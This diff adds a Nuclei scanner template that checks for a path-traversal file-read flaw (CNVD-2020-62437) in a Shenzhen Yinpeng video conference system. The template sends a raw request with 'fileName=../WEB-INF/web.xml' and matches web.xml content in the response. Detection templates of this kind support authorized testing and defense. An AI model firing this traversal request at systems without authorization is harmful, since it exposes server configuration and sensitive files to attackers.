@@ -1,0 +1,32 @@
+id: hst-cvs-todownload-file-read
+info:
+  name: HST CVS toDownload.do File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Shenzhen Yinpeng Cloud Computing Co., Ltd. video conference system contains a file read vulnerability which allows attackers to obtain sensitive information by accessing arbitrary files.
+  tags: file-read
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-62437
+  classification:
+    cwe-id: "22"
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+    cvss-score: 7.5
+
+http:
+  - raw:
+      - |
+        GET /register/toDownload.do?fileName=../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<welcome-file>/WEB-INF/pages/other/toLogin.jsp</welcome-file>"
+          - "<web-app "
+        part: body
